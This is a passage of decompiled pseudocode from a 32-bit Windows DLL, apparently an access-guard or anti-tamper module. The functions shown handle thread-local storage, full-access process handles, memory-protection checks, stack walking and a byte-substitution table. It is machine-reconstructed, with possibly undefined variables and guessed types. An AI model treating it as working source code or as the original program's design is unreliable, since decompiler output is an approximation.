  int v31; // [esp+F8h] [ebp-4h]
  int savedregs; // [esp+FCh] [ebp+0h] BYREF

  v30 = &v11;
  sub_10015814(v21);
  v31 = 1;
  AllocationBase = 0i64;
  v23 = this;
  if ( !TlsGetValue(dword_1017DB08) && !sub_10015C1C() )
  {
    if ( !TlsSetValue(dword_1017DB08, (LPVOID)1) )
      sub_10015C59();
    sub_10012621(&v25, 0, 0);
    v29 = 0;
    memset(&Buffer, 0, sizeof(Buffer));
    v24 = 0;
    LOBYTE(v31) = 4;
    v3 = sub_100129B6((DWORD)this, v14);
    LOBYTE(v31) = 5;
    sub_100130E8(v3 + 1, v26);
    v26[1] = v3[2];
    LOBYTE(v31) = 4;
    sub_10012679(v14);
    v27 = 0;
    if ( this == (void *)GetCurrentThreadId() )
    {
      v24 = &savedregs;
      v27 = sub_10015668((int)&savedregs);
      v28 = v4;
    }
    else
    {
      sub_10012974(&v25);
      v29 = 1;
      v27 = sub_10012BE9(&v25);
      v28 = sub_10012C43(&v25);
    }
    v20 = v28;
    sub_10015925(v21, (int)&v20);
    LOBYTE(v31) = 6;
    v5 = sub_10012882(&v25, v15, 0x1F0FFFu);
    LOBYTE(v31) = 7;
    v6 = (int *)(*(int (__thiscall **)(int *, _DWORD))(v21[0] + 44))(v21, 0);
    sub_1001FA9F(*v6, (int)v5, (int)v12, 0);
    LOBYTE(v31) = 9;
    sub_100128CB(v15);
    sub_1001FC2F((int)v12, &Buffer);
    AllocationBase = (int)Buffer.AllocationBase;
    LOBYTE(v31) = 6;
    sub_1001FBA6((int)v12);
    v31 = 4;
    for ( i = 0; i < 31; ++i )
    {
      LOBYTE(v31) = 11;
      v27 = sub_10015668(v27);
      v28 = v8;
      v31 = 4;
      v19 = v8;
      sub_10015925(v21, (int)&v19);
    }
    v31 = 3;
    if ( v29 )
      sub_10012837(&v25);
    LOBYTE(v31) = 14;
    v9 = sub_1000B87D(v17);
    LOBYTE(v31) = 15;
    sub_1001EF3B((int)v13, dword_101868FC, 0, *(LPSECURITY_ATTRIBUTES *)(*v9 + 4));
    LOBYTE(v31) = 17;
    sub_10007D7A(v17);
    sub_1000EDE4((int *)v13, v18);
    LOBYTE(v31) = 18;
    if ( dword_10179DE8 )
      (**(void (__thiscall ***)(int, int *, int))dword_10179DE8)(dword_10179DE8, v21, a2);
    LOBYTE(v31) = 17;
    sub_1000EDA4(v18);
    LOBYTE(v31) = 14;
    sub_1001F16A(v13);
    v31 = 3;
    if ( !TlsSetValue(dword_1017DB08, 0) )
      sub_10015C59();
    LOBYTE(v31) = 1;
    sub_10012679(&v25);
  }
  v31 = -1;
  return sub_1001584F((int)v21);
}
// 10015441: variable 'v4' is possibly undefined
// 10015514: variable 'v8' is possibly undefined
// 10015C59: using guessed type void __noreturn sub_10015C59(void);
// 10179DE8: using guessed type int dword_10179DE8;
// 101868FC: using guessed type _DWORD dword_101868FC[2];
// 1001535A: using guessed type int var_A4[3];
// 1001535A: using guessed type int var_98[3];
// 1001535A: using guessed type HANDLE var_C0[7];

//----- (10015644) --------------------------------------------------------
void *__stdcall sub_10015644(int a1)
{
  return sub_1001584F(a1);
}

//----- (10015668) --------------------------------------------------------
int __cdecl sub_10015668(int a1)
{
  int v1; // ecx
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // esi
  int *v5; // ecx
  char v7[8]; // [esp+Ch] [ebp-74h] BYREF
  char v8[36]; // [esp+14h] [ebp-6Ch] BYREF
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+38h] [ebp-48h] BYREF
  _DWORD v10[5]; // [esp+54h] [ebp-2Ch] BYREF
  int v11[3]; // [esp+68h] [ebp-18h] BYREF
  int v12; // [esp+7Ch] [ebp-4h]

  v2 = (*(int (__thiscall **)(int, int *, int))(*(_DWORD *)v1 + 40))(v1, v11, 2035711);
  v12 = 0;
  sub_1001FA9F(a1, v2, (int)v7, 8);
  LOBYTE(v12) = 2;
  sub_100128CB(v11);
  sub_1001FC2F((int)v7, &Buffer);
  if ( Buffer.Protect != 2 && Buffer.Protect != 4 && Buffer.Protect != 32 && Buffer.Protect != 64 )
  {
    v3 = sub_1000E9DF(v11, 0, 1);
    LOBYTE(v12) = 3;
    sub_1000A947(v3, 276);
  }
  sub_1000B1F3((void *)8, (int)v10, 0);
  LOBYTE(v12) = 4;
  sub_10011746(v8, v10);
  v4 = *(_DWORD *)sub_1000B4B8(v10);
  LOBYTE(v12) = 2;
  sub_1000B3DF(v5);
  v12 = -1;
  sub_1001FBA6((int)v7);
  return v4;
}
// 10015675: variable 'v1' is possibly undefined
// 10015710: variable 'v5' is possibly undefined
// 10015668: using guessed type int var_18[3];
// 10015668: using guessed type _DWORD var_2C[5];
// 10015668: using guessed type char var_6C[36];

//----- (10015734) --------------------------------------------------------
_DWORD *sub_10015734()
{
  int v0; // esi
  _DWORD *v1; // eax
  int v2; // eax
  int v4[3]; // [esp+10h] [ebp-1Ch] BYREF
  int v5; // [esp+1Ch] [ebp-10h]
  int v6; // [esp+28h] [ebp-4h]

  v5 = 0;
  v4[2] = (int)dword_101868FC;
  sub_1000E73C();
  v0 = sub_1000E70F(0xFFFFFFFF);
  v1 = sub_1000D17D(v4, &word_10179DEC);
  v6 = 1;
  v2 = sub_1000D6C3((int)v1, aDvaaccessguard, v0);
  sub_1000D372(dword_101868FC, v2);
  v5 = 1;
  LOBYTE(v6) = 0;
  sub_1000D3AD(v4);
  return dword_101868FC;
}
// 101868FC: using guessed type _DWORD dword_101868FC[2];

//----- (100157AA) --------------------------------------------------------
_DWORD *__thiscall sub_100157AA(void *this, _DWORD *a2)
{
  _DWORD *v3; // esi
  int v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
  {
    v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v3[1] = this;
    *v3 = &off_101023F8;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 101023F8: using guessed type int (__thiscall *off_101023F8)(void *Block, char);

//----- (10015814) --------------------------------------------------------
_DWORD *__stdcall sub_10015814(_DWORD *a1)
{
  sub_1000E6CA(a1);
  *a1 = &off_10102828;
  sub_10015B58(16, a1);
  return a1;
}
// 10102828: using guessed type int (__thiscall *off_10102828)(void *Block, char);

//----- (1001584F) --------------------------------------------------------
void *__thiscall sub_1001584F(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_10102828;
  v4 = 1;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  v4 = -1;
  return sub_100185A9((_DWORD *)this);
}
// 10102828: using guessed type int (__thiscall *off_10102828)(void *Block, char);

//----- (100158AD) --------------------------------------------------------
int __thiscall sub_100158AD(_DWORD *this, int *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  _DWORD *v7; // ecx
  int result; // eax
  int v9; // [esp+8h] [ebp-8h]
  int v10; // [esp+Ch] [ebp-4h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1013FB8F);
  v4 = *this;
  v9 = *a2;
  v10 = a2[1];
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
  {
    v7 = (_DWORD *)(this[3] + 8 * i);
    *v7 = *(v7 - 2);
    v7[1] = *(v7 - 1);
  }
  result = this[3];
  *(_DWORD *)(result + 8 * a3) = v9;
  *(_DWORD *)(result + 8 * a3 + 4) = v10;
  ++this[1];
  return result;
}

//----- (10015925) --------------------------------------------------------
int __thiscall sub_10015925(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10015940) --------------------------------------------------------
int __thiscall sub_10015940(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi
  _DWORD *v4; // eax
  int v5; // eax
  int v6; // ecx

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013FC6E);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = (_DWORD *)(this[3] + 8 * v2);
    *v4 = v4[2];
    v4[1] = v4[3];
    ++v2;
  }
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  v6 = this[3];
  *(_DWORD *)(v6 + 8 * v5) = 0;
  *(_DWORD *)(v6 + 8 * v5 + 4) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (10015997) --------------------------------------------------------
int __thiscall sub_10015997(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1013FC6F);
  return this[3] + 8 * a2;
}

//----- (100159B8) --------------------------------------------------------
int __thiscall sub_100159B8(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1013FCE6);
  return this[3] + 8 * a2;
}

//----- (100159D9) --------------------------------------------------------
int __thiscall sub_100159D9(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax
  int v5; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
  {
    v4 = this[3];
    *(_DWORD *)(v4 + 8 * i) = 0;
    *(_DWORD *)(v4 + 8 * i + 4) = 0;
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v5 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v5 + 88))(this);
}

//----- (10015A20) --------------------------------------------------------
unsigned int __thiscall sub_10015A20(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013FCE7);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10015A92) --------------------------------------------------------
unsigned int __thiscall sub_10015A92(void *this, unsigned int a2, int a3)
{
  unsigned int result; // eax
  _DWORD *v4; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( a2 >= result )
  {
    v4 = sub_1000E8EF(&a2);
    sub_100078FE((int)v4);
  }
  return result;
}

//----- (10015ACC) --------------------------------------------------------
unsigned int __thiscall sub_10015ACC(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // ebx
  unsigned int result; // eax
  int v8; // ecx
  int v9; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(8 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      v8 = this[3];
      v9 = 8 * v6;
      *(_DWORD *)(v9 + v8) = *(_DWORD *)(8 * v6 + a3);
      *(_DWORD *)(v9 + v8 + 4) = *(_DWORD *)(8 * v6++ + a3 + 4);
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (10015B39) --------------------------------------------------------
void *__thiscall sub_10015B39(void *Block, char a2)
{
  sub_1001584F((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10015B58) --------------------------------------------------------
void *__usercall sub_10015B58@<eax>(int a1@<eax>, _DWORD *a2@<esi>)
{
  void *result; // eax

  a2[1] = 0;
  a2[2] = a1;
  result = operator new(8 * a1);
  a2[3] = result;
  return result;
}

//----- (10015B78) --------------------------------------------------------
_DWORD *__thiscall sub_10015B78(_DWORD *Block, char a2)
{
  sub_10015B97(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10015B97) --------------------------------------------------------
BOOL __thiscall sub_10015B97(_DWORD *this)
{
  BOOL result; // eax
  _DWORD *v2; // eax
  int v3; // [esp+0h] [ebp-28h] BYREF
  _DWORD v4[4]; // [esp+Ch] [ebp-1Ch] BYREF
  int v5; // [esp+24h] [ebp-4h]

  v4[3] = &v3;
  *this = off_10102884;
  v5 = 0;
  result = TlsFree(this[1]);
  if ( !result )
  {
    v2 = sub_1000E9DF(v4, 1, 1);
    LOBYTE(v5) = 1;
    sub_1000A947(v2, 19);
  }
  return result;
}
// 10102884: using guessed type int (__thiscall *off_10102884[2])(void *Block, char);

//----- (10015BF6) --------------------------------------------------------
void __noreturn sub_10015BF6()
{
  _DWORD *v0; // eax
  _DWORD v1[6]; // [esp+0h] [ebp-18h] BYREF

  v0 = sub_1000E9DF(v1, 1, 1);
  v1[5] = 0;
  sub_1000A947(v0, 27);
}
// 10015BF6: using guessed type void __noreturn sub_10015BF6();

//----- (10015C1C) --------------------------------------------------------
int sub_10015C1C()
{
  _DWORD *v0; // eax
  _DWORD v2[6]; // [esp+0h] [ebp-18h] BYREF

  if ( GetLastError() )
  {
    v0 = sub_1000E9DF(v2, 1, 1);
    v2[5] = 0;
    sub_1000A947(v0, 41);
  }
  return 0;
}

//----- (10015C59) --------------------------------------------------------
void __noreturn sub_10015C59()
{
  _DWORD *v0; // eax
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = 0;
  v0 = sub_1000E9DF(v1, 1, 1);
  v1[6] = 0;
  sub_1000A947(v0, 46);
}
// 1000A947: using guessed type void __cdecl __noreturn sub_1000A947(_DWORD, _DWORD);
// 10015C59: using guessed type void __noreturn sub_10015C59();

//----- (10015C83) --------------------------------------------------------
_DWORD *__stdcall sub_10015C83(_DWORD *a1, char a2, int a3)
{
  sub_1000E7F7(a2, a3);
  *a1 = &off_10102A68;
  return a1;
}
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);
// 10102A68: using guessed type int (__thiscall *off_10102A68)(void *Block, char);

//----- (10015CC2) --------------------------------------------------------
_DWORD *__stdcall sub_10015CC2(_DWORD *a1)
{
  sub_10015C83(a1, 1, 0);
  *a1 = &off_10102888;
  return a1;
}
// 10102888: using guessed type int (__thiscall *off_10102888)(void *Block, char);

//----- (10015CF9) --------------------------------------------------------
_DWORD *__stdcall sub_10015CF9(_DWORD *a1, char a2)
{
  sub_10015C83(a1, a2, 0);
  *a1 = &off_10102888;
  return a1;
}
// 10102888: using guessed type int (__thiscall *off_10102888)(void *Block, char);

//----- (10015D31) --------------------------------------------------------
_DWORD *__thiscall sub_10015D31(_DWORD *Block, char a2)
{
  sub_10015D50(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10015D50) --------------------------------------------------------
void __thiscall sub_10015D50(_DWORD *this)
{
  *this = &off_10102888;
  sub_100209C9(this);
}
// 10102888: using guessed type int (__thiscall *off_10102888)(void *Block, char);

//----- (10015D79) --------------------------------------------------------
_DWORD *__userpurge sub_10015D79@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_10015C83(a2, 1, a1);
  *a2 = &off_10102888;
  a2[1] = a1;
  return a2;
}
// 10102888: using guessed type int (__thiscall *off_10102888)(void *Block, char);

//----- (10015DB2) --------------------------------------------------------
_DWORD *__thiscall sub_10015DB2(void *this, _DWORD *a2, int a3)
{
  void *v3; // edx

  sub_100201A0(this, (int)a2, 0);
  a2[4] = a3;
  *a2 = &off_10102890;
  sub_1000B1F3((void *)1, (int)(a2 + 5), v3);
  return a2;
}
// 10015DE1: variable 'v3' is possibly undefined
// 10102890: using guessed type int (__thiscall *off_10102890)(void *Block, char);

//----- (10015DFC) --------------------------------------------------------
void *__thiscall sub_10015DFC(void *Block, char a2)
{
  sub_10015E1B((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10015E1B) --------------------------------------------------------
void *__thiscall sub_10015E1B(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_10102890;
  v4 = 2;
  sub_10020227((_BYTE *)this);
  v4 = 0;
  sub_1000B3DF((int *)(this + 20));
  v4 = -1;
  return sub_100201D0((_BYTE *)this);
}
// 10102890: using guessed type int (__thiscall *off_10102890)(void *Block, char);

//----- (10015E82) --------------------------------------------------------
int __thiscall sub_10015E82(void *this, _BYTE *a2)
{
  int v2; // esi
  int v3; // ecx
  int v4; // edi

  v2 = (int)this + 20;
  v4 = (*(int (__stdcall **)(int))(*(_DWORD *)this + 12))((int)this + 20);
  if ( v4 )
    *a2 = *(_BYTE *)sub_1000B4CB(v2, v3, 0);
  return v4;
}
// 10015E9A: variable 'v3' is possibly undefined

//----- (10015EAE) --------------------------------------------------------
int __thiscall sub_10015EAE(_DWORD **this, int a2)
{
  int v3; // eax
  int v4; // eax
  int v5; // edi
  int v7; // eax
  int v8[5]; // [esp+Ch] [ebp-48h] BYREF
  int v9[5]; // [esp+20h] [ebp-34h] BYREF
  int v10[5]; // [esp+34h] [ebp-20h] BYREF
  int v11; // [esp+50h] [ebp-4h]

  sub_1000B1F3(*(void **)(a2 + 12), (int)v10, 0);
  v11 = 0;
  v3 = ((int (__thiscall *)(_DWORD **))(*this)[11])(this);
  v4 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)v3 + 12))(v3, v10);
  v5 = v4;
  if ( v4 )
  {
    sub_1000B6B7((_DWORD *)a2, (int)v9, 0, v4);
    LOBYTE(v11) = 1;
    v7 = sub_1000B67C(v10, (int)v8, 0, v5);
    LOBYTE(v11) = 2;
    (*(void (__thiscall **)(_DWORD *, int, int *))(*this[4] + 12))(this[4], v7, v9);
    LOBYTE(v11) = 1;
    sub_1000B3DF(v8);
    LOBYTE(v11) = 0;
    sub_1000B3DF(v9);
  }
  v11 = -1;
  sub_1000B3DF(v10);
  return v5;
}
// 10015EAE: using guessed type int var_20[5];
// 10015EAE: using guessed type int var_34[5];
// 10015EAE: using guessed type int var_48[5];

//----- (10015F58) --------------------------------------------------------
int __thiscall sub_10015F58(_DWORD **this, int a2, int a3)
{
  int v4; // edi
  int v5; // eax
  int v6; // eax

  v4 = ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
  v5 = ((int (__thiscall *)(_DWORD **))(*this)[11])(this);
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v5 + 8))(v5, a2, a3);
  v6 = ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
  return (*(int (__thiscall **)(_DWORD *, int))(*this[4] + 16))(this[4], v6 - v4);
}

//----- (10015F92) --------------------------------------------------------
int __thiscall sub_10015F92(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[4] + 20))(this[4]);
}

//----- (10015F9A) --------------------------------------------------------
_DWORD *__thiscall sub_10015F9A(void *this, _DWORD *a2, int a3)
{
  sub_1002033C(this, (int)a2, 0);
  a2[4] = a3;
  *a2 = &off_101028C4;
  sub_1000B1F3((void *)0x1000, (int)(a2 + 5), 0);
  sub_1000B1F3((void *)1, (int)(a2 + 10), 0);
  return a2;
}
// 101028C4: using guessed type int (__thiscall *off_101028C4)(void *Block, char);

//----- (10015FF8) --------------------------------------------------------
void *__thiscall sub_10015FF8(void *Block, char a2)
{
  sub_10016017((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10016017) --------------------------------------------------------
int __thiscall sub_10016017(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_101028C4;
  v4 = 3;
  sub_100203B7((_BYTE *)this);
  v4 = 1;
  sub_1000B3DF((int *)(this + 40));
  LOBYTE(v4) = 0;
  sub_1000B3DF((int *)(this + 20));
  v4 = -1;
  return sub_1002036C((_BYTE *)this);
}
// 101028C4: using guessed type int (__thiscall *off_101028C4)(void *Block, char);

//----- (1001608A) --------------------------------------------------------
int __thiscall sub_1001608A(char *this, char a2)
{
  char *v3; // edi

  v3 = this + 40;
  *(_BYTE *)sub_1000B4CB((int)(this + 40), (int)this, 0) = a2;
  return (*(int (__thiscall **)(char *, char *))(*(_DWORD *)this + 12))(this, v3);
}

//----- (100160B0) --------------------------------------------------------
unsigned int __thiscall sub_100160B0(_DWORD *this, _DWORD *a2)
{
  unsigned int result; // eax
  unsigned int v5; // ecx
  int v6; // eax
  int v7; // eax
  int v8[5]; // [esp+8h] [ebp-38h] BYREF
  int v9[5]; // [esp+1Ch] [ebp-24h] BYREF
  unsigned int v10; // [esp+30h] [ebp-10h]
  int v11; // [esp+3Ch] [ebp-4h]
  int v12; // [esp+48h] [ebp+8h]

  v10 = 0;
  result = a2[3];
  if ( result )
  {
    v5 = this[8];
    do
    {
      v12 = result - v10;
      if ( result - v10 >= v5 )
        v12 = v5;
      sub_1000B6B7(this + 5, (int)v9, 0, v12);
      v11 = 0;
      v6 = sub_1000B67C(a2, (int)v8, v10, v12);
      LOBYTE(v11) = 1;
      (*(void (__thiscall **)(_DWORD, int, int *))(*(_DWORD *)this[4] + 12))(this[4], v6, v9);
      LOBYTE(v11) = 0;
      sub_1000B3DF(v8);
      v7 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)v7 + 12))(v7, v9);
      v11 = -1;
      sub_1000B3DF(v9);
      v5 = this[8];
      v10 += v5;
      result = a2[3];
    }
    while ( v10 < result );
  }
  return result;
}
// 100160B0: using guessed type int var_24[5];
// 100160B0: using guessed type int var_38[5];

//----- (1001615E) --------------------------------------------------------
int __thiscall sub_1001615E(_DWORD **this, int a2, int a3)
{
  int v4; // edi
  int v5; // eax
  int v6; // eax

  v4 = ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
  v5 = ((int (__thiscall *)(_DWORD **))(*this)[9])(this);
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v5 + 8))(v5, a2, a3);
  v6 = ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
  return (*(int (__thiscall **)(_DWORD *, int))(*this[4] + 16))(this[4], v6 - v4);
}

//----- (10016198) --------------------------------------------------------
_DWORD *__thiscall sub_10016198(_DWORD *this, _DWORD *a2)
{
  *a2 = &off_101028F4;
  a2[1] = &off_10102910;
  sub_1000B36F(this, (int)(a2 + 2));
  sub_10016206((int)this, (int)(a2 + 7));
  return a2;
}
// 101028F4: using guessed type int (__thiscall *off_101028F4)(void *Block, char);
// 10102910: using guessed type int (__stdcall *off_10102910)(int);

//----- (100161E7) --------------------------------------------------------
int *__thiscall sub_100161E7(int *Block, char a2)
{
  sub_10016267(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10016206) --------------------------------------------------------
int __usercall sub_10016206@<eax>(int a1@<esi>, int a2)
{
  int v2; // ecx
  unsigned int i; // ebx

  sub_1000B1F3((void *)0x100, a2, 0);
  for ( i = 0; i <= 0xFF; ++i )
    *(_BYTE *)sub_1000B4CB(
                a2,
                v2,
                *(unsigned __int8 *)(*(_DWORD *)(a1 + 8) + *(_DWORD *)(*(_DWORD *)(a1 + 4) + 12) + i)) = i;
  return a2;
}
// 10016247: variable 'v2' is possibly undefined

//----- (10016267) --------------------------------------------------------
void __thiscall sub_10016267(int *this)
{
  *this = (int)&off_101028F4;
  this[1] = (int)&off_10102910;
  sub_1000B3DF(this + 7);
  sub_1000B3DF(this + 2);
}
// 101028F4: using guessed type int (__thiscall *off_101028F4)(void *Block, char);
// 10102910: using guessed type int (__stdcall *off_10102910)(int);

//----- (100162AA) --------------------------------------------------------
int __thiscall sub_100162AA(void *this, int a2, int a3)
{
  return (*(int (__stdcall **)(int, int, int))(*(_DWORD *)this + 24))(a2, a3, (int)this + 8);
}

//----- (100162C0) --------------------------------------------------------
int __thiscall sub_100162C0(_DWORD *this, int a2, int a3)
{
  return (*(int (__thiscall **)(_DWORD *, int, int, _DWORD *))(*(this - 1) + 24))(this - 1, a2, a3, this + 6);
}

//----- (100162DB) --------------------------------------------------------
int __stdcall sub_100162DB(_DWORD *a1, int a2, _DWORD *a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v5; // ebx
  _DWORD *v6; // edx
  int v7; // ecx
  int v8; // edi
  int v9; // eax
  _BYTE *v10; // ecx
  int result; // eax

  v3 = a1[3];
  if ( v3 != *(_DWORD *)(a2 + 12) )
  {
    v4 = sub_1000E7F7(&a2, 1, 0);
    sub_10007882((int)v4);
  }
  v5 = sub_1000B4B8(a1);
  v8 = sub_1000B49B(v6, v7);
  v9 = sub_1000B4B8(a3);
  if ( v3 )
  {
    v10 = (_BYTE *)v8;
    do
    {
      *v10 = *(_BYTE *)((unsigned __int8)v10[v5 - v8] + v9);
      ++v10;
      --v3;
    }
    while ( v3 );
  }
  result = *(_DWORD *)(a2 + 4);
  *(_BYTE *)(result + 8) = 1;
  return result;
}
// 10016317: variable 'v6' is possibly undefined
// 10016317: variable 'v7' is possibly undefined

//----- (1001635B) --------------------------------------------------------
char sub_1001635B()
{
  return sub_10051B21();
}

//----- (10016363) --------------------------------------------------------
int *__thiscall sub_10016363(int *this, char a2)
{
  return sub_100161E7(this - 1, a2);
}

//----- (1001636B) --------------------------------------------------------
int __thiscall sub_1001636B(char *this)
{
  return nullsub_2(this - 4);
}
// 1001B4DB: using guessed type int __thiscall nullsub_2(_DWORD);

//----- (10016373) --------------------------------------------------------
int __stdcall sub_10016373(int a1)
{
  return nullsub_3(a1);
}
// 10016358: using guessed type _DWORD __stdcall nullsub_3(_DWORD);

//----- (1001637B) --------------------------------------------------------
int __thiscall sub_1001637B(void *this)
{
  return (*(int (__thiscall **)(void *, void *))(*(_DWORD *)this + 96))(this, &unk_101868EC);
}

//----- (10016386) --------------------------------------------------------
void __thiscall sub_10016386(_DWORD *this, int a2, volatile LONG *lpAddend)
{
  _DWORD *v3; // esi
  int v4; // ebx
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  void (__thiscall **v9)(void *, volatile LONG *, volatile LONG *); // eax
  int v10; // edx
  void (__thiscall **v11)(_DWORD *, int *); // eax
  _BYTE v12[8]; // [esp-18h] [ebp-74h] BYREF
  _DWORD *v13; // [esp-10h] [ebp-6Ch] BYREF
  volatile LONG *p_Addend; // [esp-Ch] [ebp-68h]
  volatile LONG *v15; // [esp-8h] [ebp-64h] BYREF
  volatile LONG *v16; // [esp-4h] [ebp-60h]
  int v17; // [esp+Ch] [ebp-50h] BYREF
  unsigned int v18; // [esp+10h] [ebp-4Ch]
  void *v19[2]; // [esp+1Ch] [ebp-40h] BYREF
  int v20; // [esp+24h] [ebp-38h] BYREF
  volatile LONG *v21; // [esp+28h] [ebp-34h]
  int v22[2]; // [esp+2Ch] [ebp-30h] BYREF
  void *v23; // [esp+34h] [ebp-28h]
  void *v24; // [esp+38h] [ebp-24h]
  unsigned int i; // [esp+3Ch] [ebp-20h]
  _DWORD *v26; // [esp+40h] [ebp-1Ch]
  void *Block; // [esp+44h] [ebp-18h]
  LONG Addend; // [esp+48h] [ebp-14h] BYREF
  unsigned int v29; // [esp+4Ch] [ebp-10h]
  int v30; // [esp+58h] [ebp-4h]

  v3 = this;
  v26 = this;
  v30 = 0;
  sub_1000D17D(&v20, &word_10179CDC);
  LOBYTE(v30) = 1;
  v4 = a2;
  (*(void (__thiscall **)(int, int *, int *))(*(_DWORD *)a2 + 104))(a2, &v17, &v20);
  LOBYTE(v30) = 3;
  sub_1000D3AD(&v20);
  v29 = 0;
  for ( i = v18; v29 < i; ++v29 )
  {
    v5 = (*(int (__thiscall **)(int *, unsigned int))(v17 + 44))(&v17, v29);
    sub_1000D372(v22, v5);
    LOBYTE(v30) = 4;
    v6 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)v4 + 92))(v4, v22);
    if ( v6 >= 4 )
    {
      if ( v6 <= 10 )
      {
        v10 = *(_DWORD *)v4;
        v16 = (volatile LONG *)v6;
        v23 = v12;
        (*(void (__thiscall **)(int, _BYTE *, int *, int))(v10 + 76))(v4, v12, v22, v6);
        LOBYTE(v30) = 14;
        v11 = (void (__thiscall **)(_DWORD *, int *))(*v3 + 52);
        LOBYTE(v30) = 4;
        (*v11)(v3, v22);
      }
      else if ( v6 == 11 )
      {
        Addend = 1;
        Block = operator new(0x28u);
        LOBYTE(v30) = 5;
        if ( Block )
        {
          v15 = v16;
          v24 = &v15;
          sub_1000D372(&v15, (int)v22);
          LOBYTE(v30) = 6;
          p_Addend = &Addend;
          v13 = v3;
          v23 = &v13;
          InterlockedIncrement(&Addend);
          LOBYTE(v30) = 5;
